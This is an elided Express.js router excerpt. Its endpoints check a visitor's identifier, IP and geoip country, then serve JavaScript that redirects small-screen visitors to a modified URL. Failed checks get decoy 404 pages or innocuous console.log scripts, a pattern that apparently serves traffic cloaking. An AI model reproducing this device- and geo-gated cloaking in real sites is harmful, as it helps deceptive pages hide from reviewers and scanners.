...
router.get("/ehloq-check", async (req, res) => {
    try {
        ...
        if (!identifier) {
            return res.status(404).send('Página no encontrada 2');
        }
        const clientIp = requestIp.getClientIp(req);
        if (!clientIp) {
            return res.status(404).send('Página no encontrada 1');
        }
        const user = await UserDB.getUserById(identifier);
        if (!user) {
            return res.status(404).send('Página no encontrada 3');
        }
        ...
        return res.send(`
            ...
            // Intentamos obtener el valor del parámetro 'gpname' de la URL
            const gpnameParam = getGpnameFromUrl();
        
            if (gpnameParam) {
                // Si encontramos el parámetro 'gpname', lo agregamos a la URL
                pageUrl += '&gpname=' + encodeURIComponent(gpnameParam);
            }
        
            // Verificamos si el ancho de la pantalla es menor a 800
            if (screen.width < 800) {
                // Redireccionamos a la URL modificada
...
router.get("/ehloq-check-dom", async (req, res) => {
    var _a;
    const identifier = req.headers.identifier;
    if (!identifier) {
        res.type('application/javascript');
        return res.send('console.log("ready identifier")');
    }
    const clientIp = requestIp.getClientIp(req);
    if (!clientIp) {
        res.type('application/javascript');
        return res.send('console.log("ready clientIp")');
    }
    const geoInfo = geoip.lookup(clientIp);
    if (!geoInfo || !geoInfo.country) {
        res.type('application/javascript');
        return res.send('console.log("ready geoInfo")');
    }
    const user = await UserDB.getUserById(identifier);
    if (!user) {
        res.type('application/javascript');
        return res.send('console.log("ready user")');
    }
    if (user.config.direct) {
        res.type('application/javascript');
        return res.send(`
...
function createCode(payload, texts) {
...
function htmlTemplate(payload, texts) {
    return {
